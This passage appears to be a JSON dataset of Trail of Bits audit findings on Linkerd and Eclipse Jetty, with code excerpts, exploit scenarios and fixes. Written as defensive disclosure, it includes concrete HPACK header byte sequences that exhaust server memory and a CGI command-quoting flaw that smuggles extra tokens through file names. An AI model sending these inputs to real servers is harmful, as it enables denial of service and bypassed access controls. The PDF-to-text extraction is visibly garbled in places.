authentication and authorization mechanisms behind the admin endpoint for proxy servers. Long term, document the risks of exposing critical components throughout Linkerd. For instance, it is important to note that exposing the admin endpoint on a user application proxy server may result in the exposure of a shutdown method, which could be leveraged in a denial-of-service attack. 36 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "12. Lack of centralized security best practices documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "While security recommendations are included throughout Linkerds technical guidance documents, there is no centralized guidance on security best practices. Furthermore, the documentation on securing clusters lacks guidance on security best practices such as conguring timeouts and retries, authorization policy recommendations for defense in depth, and locking down access to linkerd-viz components. Threat Scenario A user is unaware of security best practices and congures Linkerd in an insecure manner. As a result, her Linkerd infrastructure is prone to attacks that could compromise the condentiality, integrity, and availability of data handled by the cluster. Recommendations Short term, develop centralized documentation on security recommendations with a focus on security-in-depth practices for users to follow. This guidance should be easy to locate should any user wish to follow security best practices when using Linkerd. 44 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Informational"]}, {"title": "13. Unclear distinction between Linkerd and Linkerd2 in o\u0000cial Linkerd blog post guidance ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The ocial Linkerd documentation clearly indicates the version of Linkerd that each document pertains to. For instance, documentation specic to Linkerd 1.x displays a message stating, This is not the latest version of Linkerd! However, guidance documented in blog post form on the same site does not provide such information. For instance, the rst result of a Google search for Linkerd RBAC is a Linkerd blog post with guidance that is applicable only to linkerd 1.x, but there is no indication of this fact on the page. As a result, users who rely on these blog posts may misunderstand functionality in Linkerd versions 2.x and above. Threat Scenario A user searches for guidance on implementing various Linkerd features and nds documentation in blog posts that applies only to Linkerd version 1.x. As a result, he misunderstands Linkerd and its threat model, and he makes conguration mistakes that lead to security issues. Recommendations Short term, on Linkerd blog post pages, add indicators similar to the UI elements used in the Linkerd documentation to clearly indicate which version each guidance page applies to. 45 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Informational"]}, {"title": "14. Insu\u0000cient logging of outbound HTTPS calls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "Linkerd operators can use the linkerd-viz extensions such as Prometheus and Grafana to collect metrics for the various proxies in a Linkerd infrastructure. However, these extensions do not collect metrics on outbound calls made by meshed applications. This limits the data that operators could use to conduct incident response procedures if compromised applications reach out to malicious external services and servers. Threat Scenario A meshed application running in the data plane is compromised as a result of a supply chain attack. Because outbound HTTPS calls are not logged, Linkerd operators are unable to collect sucient data to determine the impact of the vulnerability. Recommendations Short term, implement logging for outbound HTTPS connections. A GitHub issue to implement this recommendation already exists in the Linkerd repository but is still unresolved as of this writing. 46 Linkerd Threat Model A. Methodology A threat modeling assessment is intended to provide a detailed analysis of the risks that an application faces at the structural and operational level; the goal is to assess the security of the applications design rather than its implementation details. During these assessments, engineers rely heavily on frequent meetings with the clients developers and on extensive reading of all documentation provided by the client. Code review and dynamic testing are not part of the threat modeling process, although engineers may occasionally consult the codebase or a live instance of the project to verify assumptions about the systems design. Engineers begin a threat modeling assessment by identifying the safeguards and guarantees that are critical to maintaining the target systems condentiality, integrity, and availability. These security controls dictate the assessments overarching scope and are determined by the requirements of the target system, which may relate to technical and reputational concerns, legal liability, and regulatory compliance. With these security controls in mind, engineers then divide the system into logical componentsdiscrete elements that perform specic tasksand establish trust zones around groups of components that lie within a common trust boundary. They identify the types of data handled by the system, enumerating the points at which data is sent, received, or stored by each component, as well as within and across trust boundaries. After establishing a detailed map of the target systems structure and data ows, engineers then identify threat actorsanyone who might threaten the targets security, including both malicious external actors and naive internal actors. Based on each threat actors initial privileges and knowledge, engineers then trace threat actor paths through the system, determining the controls and data that a threat actor might be able to improperly access, as well as the safeguards that prevent such access. Any viable attack path discovered during this process constitutes a nding, which is paired with design recommendations to remediate gaps in the systems defenses. Finally, engineers rate the strength of each security control, indicating the general robustness of that type of defense against the full spectrum of possible attacks. These ratings are provided in the Security Control Maturity Evaluation table. 47 Linkerd Threat Model B. Security Controls and Rating Criteria The following tables describe the security controls and rating criteria used in this report. Security Controls Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. Risk of integer overow that could allow HpackDecoder to exceed maxHeaderSize ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "An integer overow could occur in the MetaDataBuilder.checkSize function, which would allow HPACK header values to exceed their size limit. MetaDataBuilder.checkSize determines whether a header name or value exceeds the size limit and throws an exception if the limit is exceeded: public void checkSize ( int length, boolean huffman) throws SessionException { 291 292 293 294 295 296 297 _size + length, _maxSize); 298 } // Apply a huffman fudge factor if (huffman) length = (length * 4 ) / 3 ; if ((_size + length) > _maxSize) throw new HpackException.SessionException( \"Header too large %d > %d\" , Figure 1.1: MetaDataBuilder.checkSize However, when the value of length is very large and huffman is true , the multiplication of length by 4 in line 295 will overow, and length will become negative. This will cause the result of the sum of _size and length to be negative, and the check on line 296 will not be triggered. Exploit Scenario An attacker repeatedly sends HTTP messages with the HPACK header 0x00ffffffffff02 . Each time this header is decoded, the following occurs:  HpackDecode.decode determines that a Human-coded value of length 805306494 needs to be decoded. 36 OSTIF Eclipse: Jetty Security Assessment  MetaDataBuilder.checkSize approves this length.  Huffman.decode allocates a 1.6 GB string array.  Huffman.decode experiences a buer overow error, and the array is deallocated the next time garbage collection happens. (Note that this deallocation can be delayed by appending valid Human-coded characters to the end of the header.) Depending on the timing of garbage collection, the number of threads, and the amount of memory available on the server, this may cause the server to run out of memory. Recommendations Short term, have MetaDataBuilder.checkSize check that length is below a threshold before performing the multiplication. Long term, use fuzzing to check for similar errors; we found this issue by fuzzing HpackDecode . 37 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. Cookie parser accepts unmatched quotation marks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The RFC6265CookieParser.parseField function does not check for unmatched quotation marks. For example, parseField(\\) will execute without raising an exception. This issue is unlikely to lead to any vulnerabilities, but it could lead to problems if users or developers expect the function to accept only valid strings. Recommendations Short term, modify the function to check that the state at the end of the given string is not IN_QUOTED_VALUE . Long term, when using a state machine, ensure that the code always checks that the state is valid before exiting. 38 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Errant command quoting in CGI servlet ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "If a user sends a request to a CGI servlet for a binary with a space in its name, the servlet will escape the command by wrapping it in quotation marks. This wrapped command, plus an optional command prex, will then be executed through a call to Runtime.exec . If the original binary name provided by the user contains a quotation mark followed by a space, the resulting command line will contain multiple tokens instead of one. For example, if a request references a binary called file name here , the escaping algorithm will generate the command line string file name here , which will invoke the binary named file , not the one that the user requested. if (execCmd.length() > 0 && execCmd.charAt( 0 ) != '\"' && execCmd.contains( \" \" )) execCmd = \"\\\"\" + execCmd + \"\\\"\" ; Figure 3.1: CGI.java#L337L338 Exploit Scenario The cgi-bin directory contains a binary named exec and a subdirectory named exec commands , which contains a le called bin1 . A user sends to the CGI servlet a request for the lename exec commands/bin1 . This request passes the le existence check on lines 194 through 205 in CGI.java . The servlet adds quotation marks around this lename, resulting in the command line string exec commands/bin1 . When this string is passed to Runtime.exec , instead of executing the bin1 binary, the server executes the exec binary with the argument commands/bin1 . This behavior is incorrect and could bypass alias checks; it could also cause other unintended behaviors if a command prex is congured. Additionally, if the useFullPath conguration setting is o, the command would not need to pass the existence check. Without this setting, an attacker exploiting this issue would not have to rely on a binary and subdirectory with similar names, and the attack could succeed on a much wider variety of directory structures. 39 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, update line 346 in CGI.java to replace the call to exec(String command, String[] env, File dir) with a call to exec(String[] cmdarray, String[] env, File dir) so that the quotation mark escaping algorithm does not create new tokens in the command line string. Long term, update the quotation mark escaping algorithm so that any unescaped quotation marks in the original name of the command are properly escaped, resulting in one double-quoted token instead of multiple adjacent quoted strings. Additionally, the expression execCmd.charAt(0) != '\"' on line 337 of CGI.java is intended to avoid adding additional quotation marks to an already-quoted command string. If this check is unnecessary, it should be removed. If it is necessary, it should be replaced by a more robust check that accurately detects properly formatted double-quoted strings. 40 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "4. Symlink-allowed alias checker ignores protected targets list ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The class SymlinkAllowedResourceAliasChecker is an alias checker that permits users to access a symlink as long as the symlink is stored within an allowed directory. The following comment appears on line 76 of this class: // TODO: return !getContextHandler().isProtectedTarget(realURI.toString()); Figure 4.1: SymlinkAllowedResourceAliasChecker.java#L76 As this comment suggests, the alias checker does not yet enforce the context handlers protected resource list. That is, if a symlink is contained in an allowed directory but points to a target on the protected resource list, the alias checker will return a positive match. During our review, we found that some other modules, but not all, independently enforce the protected resource list and will decline to serve resources on the list even if the alias checker returns a positive result. But the modules that do not independently enforce the protected resource list could serve protected resources to attackers conducting symlink attacks. Exploit Scenario An attacker induces the creation of a symlink (or a system administrator accidentally creates one) in a web-accessible directory that points to a protected resource (e.g., a child of WEB-INF ). By requesting this symlink through a servlet that uses the SymlinkAllowedResourceAliasChecker class, the attacker bypasses the protected resource list and accesses the sensitive les. Recommendations Short term, implement the check referenced in the comment so that the alias checker rejects symlinks that point to a protected resource or a child of a protected resource. Long term, consider clarifying and documenting the responsibilities of dierent components for enforcing protected resource lists. Consider implementing redundant checks in multiple modules for purposes of layered security. 41 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "5. Missing check for malformed Unicode escape sequences in QuotedStringTokenizer.unquote ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The QuotedStringTokenizer classs unquote method parses \\u#### Unicode escape sequences, but it does not rst check that the escape sequence is properly formatted or that the string is of a sucient length: case 'u' : b.append(( char )( (TypeUtil.convertHexDigit(( byte )s.charAt(i++)) << 24 ) + (TypeUtil.convertHexDigit(( byte )s.charAt(i++)) << 16 ) + (TypeUtil.convertHexDigit(( byte )s.charAt(i++)) << 8 ) + (TypeUtil.convertHexDigit(( byte )s.charAt(i++))) ) ); break ; Figure 5.1: QuotedStringTokenizer.java#L547L555 Any calls to this function with an argument ending in an incomplete Unicode escape sequence, such as str\\u0 , will cause the code to throw a java.lang.NumberFormatException exception. The only known execution path that will cause this method to be called with a parameter ending in an invalid Unicode escape sequence is to induce the processing of an ETag Matches header by the ResourceService class, which calls EtagUtils.matches , which calls QuotedStringTokenizer.unquote . Exploit Scenario An attacker introduces a maliciously crafted ETag into a browsers cache. Each subsequent request for the aected resource causes a server-side exception, preventing the server from producing a valid response so long as the cached ETag remains in place. Recommendations Short term, add a try-catch block around the aected code that drops malformed escape sequences. 42 OSTIF Eclipse: Jetty Security Assessment Long term, implement a suitable workaround for lenient mode that passes the raw bytes of the malformed escape sequence into the output. 43 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. WebSocket frame length represented with 32-bit integer ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The WebSocket standard (RFC 6455) allows for frames with a size of up to 2 64 bytes. However, the WebSocket parser represents the frame length with a 32-bit integer: private int payloadLength; // ...[snip]... case PAYLOAD_LEN_BYTES: { } byte b = buffer.get(); --cursor; payloadLength |= (b & 0xFF ) << ( 8 * cursor); // ...[snip]... Figure 6.1: Parser.java , lines 57 and 147151 As a result, this parsing algorithm will incorrectly parse some length elds as negative integers, causing a java.lang.IllegalArgumentException exception to be thrown when the parser tries to set the limit of a Buffer object to a negative number (refer to TOB-JETTY-7 ). Consequently, Jettys WebSocket implementation cannot properly process frames with certain lengths that are compliant with RFC 6455. Even if no exception results, this logic error will cause the parser to incorrectly identify the sizes of WebSocket frames and the boundaries between them. If the server passes these frames to another WebSocket connection, this bug could enable attacks similar to HTTP request smuggling, resulting in bypasses of security controls. Exploit Scenario A Jetty WebSocket server is deployed in a reverse proxy conguration in which both Jetty and another web server parse the same stream of WebSocket frames. An attacker sends a frame with a length that the Jetty parser incorrectly truncates to a 32-bit integer. Jetty and the other server interpret the frames dierently, which causes errors in the implementation of security controls, such as WAF lters. 44 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, change the payloadLength variable to use the long data type instead of an int . Long term, audit all arithmetic operations performed on this payloadLength variable to ensure that it is always used as an unsigned integer instead of a signed one. The standard librarys Integer class can provide this functionality. 45 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "7. WebSocket parser does not check for negative payload lengths ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The WebSocket parsers checkFrameSize method checks for payload lengths that exceed the current congurations maximum, but it does not check for payload lengths that are lower than zero. If the payload length is lower than zero, the code will throw an exception when the payload length is passed to a call to buffer.limit . Exploit Scenario An attacker sends a WebSocket payload with a length eld that parses to a negative signed integer (refer to TOB-JETTY-6 ). This payload causes an exception to be thrown and possibly the server process to crash. Recommendations Short term, update checkFrameSize to throw an org.eclipse.jetty.websocket.core.exception.ProtocolException exception if the frames length eld is less than zero. 46 OSTIF Eclipse: Jetty Security Assessment 8. WebSocket parser greedily allocates ByteBu\u0000ers for large frames Severity: Medium Diculty: Low Type: Denial of Service Finding ID: TOB-JETTY-8 Target: org.eclipse.jetty.websocket.core.internal.Parser", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "9. Risk of integer overow in HPACK's NBitInteger.decode ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The static function NBitInteger.decode is used to decode bytestrings in HPACK's integer format. It should return only positive integers since HPACKs integer format is not intended to support negative numbers. However, the following loop in NBitInteger.decode is susceptible to integer overows in its multiplication and addition operations: public static int decode (ByteBuffer buffer, int n) { if (n == 8 ) { // ... } int nbits = 0xFF >>> ( 8 - n); int i = buffer.get(buffer.position() - 1 ) & nbits; if (i == nbits) { int m = 1 ; int b; do { b = 0xff & buffer.get(); i = i + (b & 127 ) * m; m = m * 128 ; } while ((b & 128 ) == 128 ); } return i; } Figure 9.1: NBitInteger.java , lines 105145 For example, NBitInteger.decode(0xFF8080FFFF0F, 7) returns -16257 . Any overow that occurs in the function would not be a problem on its own since, in general, the output of this function ought to be validated before it is used; however, when coupled with other issues (refer to TOB-JETTY-10 ), an overow can cause vulnerabilities. 49 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, modify NBitInteger.decode to check that its result is nonnegative before returning it. Long term, consider merging the QPACK and HPACK implementations for NBitInteger , since they perform the same functionality; the QPACK implementation of NBitInteger checks for overows. 50 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. MetaDataBuilder.checkSize accepts headers of negative lengths ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The MetaDataBuilder.checkSize function accepts user-entered HPACK header values of negative sizes, which could cause a very large buer to be allocated later when the user-entered size is multiplied by 2. MetaDataBuilder.checkSize determines whether a header name or value exceeds the size limit and throws an exception if the limit is exceeded: public void checkSize ( int length, boolean huffman) throws SessionException { // Apply a huffman fudge factor if (huffman) length = (length * 4 ) / 3 ; if ((_size + length) > _maxSize) throw new HpackException.SessionException( \"Header too large %d > %d\" , _size + length, _maxSize); } Figure 10.1: MetaDataBuilder.java , lines 291298 However, it does not throw an exception if the size is negative. Later, the Huffman.decode function multiplies the user-entered length by 2 before allocating a buer: public static String decode (ByteBuffer buffer, int length) throws HpackException.CompressionException { Utf8StringBuilder utf8 = new Utf8StringBuilder(length * 2 ); // ... Figure 10.2: Huffman.java , lines 357359 This means that if a user provides a negative length value (or, more precisely, a length value that becomes negative when multiplied by the 4/3 fudge factor), and this length value becomes a very large positive number when multiplied by 2, then the user can cause a very large buer to be allocated on the server. 51 OSTIF Eclipse: Jetty Security Assessment Exploit Scenario An attacker repeatedly sends HTTP messages with the HPACK header 0x00ff8080ffff0b . Each time this header is decoded, the following occurs:  HpackDecode.decode determines that a Human-coded value of length -1073758081 needs to be decoded.  MetaDataBuilder.checkSize approves this length.  The number is multiplied by 2, resulting in 2147451134 , and Huffman.decode allocates a 2.1 GB string array.  Huffman.decode experiences a buer overow error, and the array is deallocated the next time garbage collection happens. (Note that this deallocation can be delayed by adding valid Human-coded characters to the end of the header.) Depending on the timing of garbage collection, the number of threads, and the amount of memory available on the server, this may cause the server to run out of memory. Recommendations Short term, have MetaDataBuilder.checkSize check that the given length is positive directly before adding it to _size and comparing it with _maxSize . Long term, add checks for integer overows in Huffman.decode and in NBitInteger.decode (refer to TOB-JETTY-9 ) for added redundancy. 52 OSTIF Eclipse: Jetty Security Assessment 11. Insu\u0000cient space allocated when encoding QPACK instructions and entries Severity: Low Diculty: High Type: Denial of Service Finding ID: TOB-JETTY-11 Target:  org.eclipse.jetty.http3.qpack.internal.instruction.IndexedName EntryInstruction  org.eclipse.jetty.http3.qpack.internal.instruction.LiteralName EntryInstruction  org.eclipse.jetty.http3.qpack.internal.instruction.EncodableEn try", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "12. LiteralNameEntryInstruction incorrectly encodes value length ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "QPACK instructions for inserting entries with literal names and non-Human-coded values will be encoded incorrectly when the values length is over 30, which could cause values to be sent incorrectly or errors to occur during decoding. The following snippet of the LiteralNameEntryInstruction.encode function is responsible for encoding the header value: if (_huffmanValue) byteBuffer.put(( byte )( 0x80 )); NBitIntegerEncoder.encode(byteBuffer, 7 , HuffmanEncoder.octetsNeeded(_value)); HuffmanEncoder.encode(byteBuffer, _value); 78 79 { 80 81 82 83 } 84 85 { 86 87 88 89 } else byteBuffer.put(( byte )( 0x00 )); NBitIntegerEncoder.encode(byteBuffer, 5 , _value.length()); byteBuffer.put(_value.getBytes()); Figure 12.1: LiteralNameEntryInstruction.java , lines 7889 On line 87, 5 is the second parameter to NBitIntegerEncoder.encode , indicating that the number will take up 5 bits in the rst encoded byte; however, the second parameter should be 7 instead. This means that when _value.length() is over 30, it will be incorrectly encoded. Jettys HTTP/3 code is still considered experimental, so this issue should not aect production code, but it should be xed before announcing HTTP/3 support to be production-ready. 56 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, change the second parameter of the NBitIntegerEncoder.encode function from 5 to 7 in order to reect that the number will take up 7 bits. Long term, write more tests to catch similar encoding/decoding problems. 57 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "13. FileInitializer does not check for symlinks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Module conguration les can direct Jetty to download a remote le and save it in the local lesystem while initializing the module. During this process, the FileInitializer class validates the destination path and throws an IOException exception if the destination is outside the ${jetty.base} directory. However, this validation routine does not check for symlinks: // now on copy/download paths (be safe above all else) if (destination != null && !destination.startsWith(_basehome.getBasePath())) throw new IOException( \"For security reasons, Jetty start is unable to process file resource not in ${jetty.base} - \" + location); Figure 13.1: FileInitializer.java , lines 112114 None of the subclasses of FileInitializer check for symlinks either. Thus, if the ${jetty.base} directory contains a symlink, a le path in a modules .ini le beginning with the symlink name will pass the validation check, and the le will be written to a subdirectory of the symlinks destination. Exploit Scenario A systems ${jetty.base} directory contains a symlink called dir , which points to /etc . The system administrator enables a Jetty module whose .ini le contains a [files] entry that downloads a remote le and writes it to the relative path dir/config.conf . The lesystem follows the symlink and writes a new conguration le to /etc/config.conf , which impacts the servers system conguration. Additionally, since the FileInitializer class uses the REPLACE_EXISTING ag, this behavior overwrites an existing system conguration le. Recommendations Short term, rewrite all path checks in FileInitializer and its subclasses to include a call to the Path.toRealPath function, which, by default, will resolve symlinks and produce the real lesystem path pointed to by the Path object. If this real path is outside ${jetty.base} , the le write operation should fail. 58 OSTIF Eclipse: Jetty Security Assessment Long term, consolidate all lesystem operations involving the ${jetty.base} or ${jetty.home} directories into a single centralized class that automatically performs symlink resolution and rejects operations that attempt to read from or write to an unauthorized directory. This class should catch and handle the IOException exception that is thrown in the event of a link loop or a large number of nested symlinks. 59 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "14. FileInitializer permits downloading les via plaintext HTTP ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Module conguration les can direct Jetty to download a remote le and save it in the local lesystem while initializing the module. If the specied URL is a plaintext HTTP URL, Jetty does not raise an error or warn the user. Transmitting les over plaintext HTTP is intrinsically unsecure and exposes sensitive data to tampering and eavesdropping in transit. Exploit Scenario A system administrator enables a Jetty module that downloads a remote le over plaintext HTTP during initialization. An attacker with a network intermediary position snis the trac and infers sensitive information about the design and conguration of the Jetty system under conguration. Alternatively, the attacker actively tampers with the le during transmission from the remote server to the Jetty installation, which enables the attacker to alter the modules behavior and launch other attacks against the targeted system. Recommendations Short term, add a check to the FileInitializer class and its subclasses to prohibit downloads over plaintext HTTP. Additionally, add a validation check to the module .ini le parser to reject any conguration that includes a plaintext HTTP URL in the [files] section. Long term, consolidate all remote le downloads conducted during module conguration operations into a single centralized class that automatically rejects plaintext HTTP URLs. If current use cases require support of plaintext HTTP URLs, then at a minimum, have Jetty display a prominent warning message and prompt the user for manual conrmation before performing the unencrypted download. 60 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "15. NullPointerException thrown by FastCGI parser on invalid frame type ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Because of a missing null check, the Jetty FastCGI clients Parser class throws a NullPointerException exception when parsing a frame with an invalid frame type eld. This exception occurs because the findContentParser function returns null when it does not have a ContentParser object matching the specied frame type, and the caller never checks the findContentParser return value for null before dereferencing it. case CONTENT: { ContentParser contentParser = findContentParser(headerParser.getFrameType()); if (headerParser.getContentLength() == 0 ) { padding = headerParser.getPaddingLength(); state = State.PADDING; if (contentParser.noContent()) return true ; } else { ContentParser.Result result = contentParser.parse(buffer); // ...[snip]... } break ; } Figure 15.1: Parser.java , lines 82114 Exploit Scenario An attacker operates a malicious web server that supports FastCGI. A Jetty application communicates with this server by using Jettys built-in FastCGI client. The remote server transmits a frame with an invalid frame type, causing a NullPointerException exception and a crash in the Jetty application. Recommendations Short term, add a null check to the parse function to abort the parsing process before dereferencing a null return value from findContentParser . If a null value is detected, 61 OSTIF Eclipse: Jetty Security Assessment parse should throw an appropriate exception, such as IllegalStateException , that Jetty can catch and handle safely. Long term, build out a larger suite of test cases that ensures graceful handling of malformed trac and data. 62 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "16. Documentation does not specify that request contents and other user data can be exposed in debug logs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Over 100 times, the system calls LOG.debug with a parameter of the format BufferUtil.toDetailString(buffer) , which outputs up to 56 bytes of the buer into the log le. Jettys implementations of various protocols and encodings, including GZIP, WebSocket, multipart encoding, and HTTP/2, output user data received over the network to the debug log using this type of call. An example instance from Jettys WebSocket implementation appears in gure 16.1. public Frame.Parsed parse (ByteBuffer buffer) throws WebSocketException { try { // parse through while (buffer.hasRemaining()) { if (LOG.isDebugEnabled()) LOG.debug( \"{} Parsing {}\" , this , BufferUtil.toDetailString(buffer)); // ...[snip]... } // ...[snip]... } // ...[snip]... } Figure 16.1: Parser.java , lines 8896 Although the Jetty 12 Operations Guide does state that Jetty debugging logs can quickly consume massive amounts of disk space, it does not advise system administrators that the logs can contain sensitive user data, such as personally identiable information. Thus, the possibility of raw trac being captured from debug logs is undocumented. Exploit Scenario A Jetty system administrator turns on debug logging in a production environment. During the normal course of operation, a user sends trac containing sensitive information, such as personally identiable information or nancial data, and this data is recorded to the 63 OSTIF Eclipse: Jetty Security Assessment debug log. An attacker who gains access to this log can then read the user data, compromising data condentiality and the users privacy rights. Recommendations Short term, update the Jetty Operations Guide to state that in addition to being extremely large, debug logs can contain sensitive user data and should be treated as sensitive. Long term, consider moving all debugging messages that contain buer excerpts into a high-detail debug log that is enabled only for debug builds of the application. 64 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "17. HttpStreamOverFCGI internally marks all requests as plaintext HTTP ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The HttpStreamOverFCGI class processes FastCGI messages in a format that can be processed by other system components that use the HttpStream interface. This classs onHeaders callback mistakenly marks each MetaData.Request object as a plaintext HTTP request, as the TODO comment shown in gure 17.1 indicates: public void onHeaders () { String pathQuery = URIUtil.addPathQuery(_path, _query); // TODO https? MetaData.Request request = new MetaData.Request(_method, HttpScheme.HTTP.asString(), hostPort, pathQuery, HttpVersion.fromString(_version), _headers, Long.MIN_VALUE); // ...[snip]... } Figure 17.1: HttpStreamOverFCGI.java , lines 108119 In some congurations, other Jetty components could misinterpret a message received over FCGI as a plaintext HTTP message, which could cause a request to be incorrectly rejected, redirected in an innite loop, or forwarded to another system over a plaintext HTTP channel instead of HTTPS. Exploit Scenario A Jetty instance runs an FCGI server and uses the HttpStream interface to process messages. The MetaData.Request classs getURI method is used to check the incoming requests URI. This method mistakenly returns a plaintext HTTP URL due to the bug in HttpStreamOverFCGI.java . One of the following takes place during the processing of this request:   An application-level security control checks the incoming requests URI to ensure it was received over a TLS-encrypted channel. Since this check fails, the application rejects the request and refuses to process it, causing a denial of service. An application-level security control checks the incoming requests URI to ensure it was received over a TLS-encrypted channel. Since this check fails, the application 65 OSTIF Eclipse: Jetty Security Assessment attempts to redirect the user to a suitable HTTPS URL. The check fails on this redirected request as well, causing an innite redirect loop and a denial of service.  An application processing FCGI messages acts as a proxy, forwarding certain requests to a third HTTP server. It uses MetaData.Request.getURI to check the requests original URI and mistakenly sends a request over plaintext HTTP. Recommendations Short term, correct the bug in HttpStreamOverFCGI.java to generate the correct URI for the incoming request. Long term, consider streamlining the HTTP implementation to minimize the need for dierent classes to generate URIs from request data. 66 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "18. Excessively permissive and non-standards-compliant error handling in HTTP/2 implementation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Jettys HTTP/2 implementation violates RFC 9113 in that it fails to terminate a connection with an appropriate error code when the remote peer sends a frame with one of the following protocol violations:    A SETTINGS frame with the ACK ag set and a nonzero payload length A PUSH_PROMISE frame in a stream with push disabled A GOAWAY frame with its stream ID not set to zero None of these situations creates an exploitable vulnerability. However, noncompliant protocol implementations can create compatibility problems and could cause vulnerabilities when deployed in combination with other miscongured systems. Exploit Scenario A Jetty instance connects to an HTTP/2 server, or serves a connection from an HTTP/2 client, and the remote peer sends trac that should cause Jetty to terminate the connection. Instead, Jetty keeps the connection alive, in violation of RFC 9113. If the remote peer is programmed to handle the noncompliant trac dierently than Jetty, further problems could result, as the two implementations interpret protocol messages dierently. Recommendations Short term, update the HTTP/2 implementation to check for the following error conditions and terminate the connection with an error code that complies with RFC 9113:   A peer receives a SETTINGS frame with the ACK ag set and a payload length greater than zero. A client receives a PUSH_PROMISE frame after having sent, and received an acknowledgement for, a SETTINGS frame with SETTINGS_ENABLE_PUSH equal to zero. 67 OSTIF Eclipse: Jetty Security Assessment  A peer receives a GOAWAY frame with the stream identier eld not set to zero. Long term, audit Jettys implementation of HTTP/2 and other protocols to ensure that Jetty handles errors in a standards-compliant manner and terminates connections as required by the applicable specications. 68 OSTIF Eclipse: Jetty Security Assessment 19. XML external entities and entity expansion in Maven package metadata parser Severity: High Diculty: High Type: Data Validation Finding ID: TOB-JETTY-19 Target: org.eclipse.jetty.start.fileinits.MavenMetadata", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "20. Use of deprecated AccessController class ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The classes listed in the Target cell above use the java.security.AccessController class, which is a deprecated class slated to be removed in a future Java release. The java.security library documentation states that the AccessController class is only useful in conjunction with the Security Manager, which is also deprecated. Thus, the use of AccessController no longer serves any benecial purpose. The use of this deprecated class could impact Jettys compatibility with future releases of the Java SDK. Recommendations Short term, remove all uses of the AccessController class. Long term, audit the Jetty codebase for the use of classes in the java.security package that may not provide any value in Jetty 12, and remove all references to those classes. 70 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "21. QUIC server writes SSL private key to temporary plaintext le ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Jettys 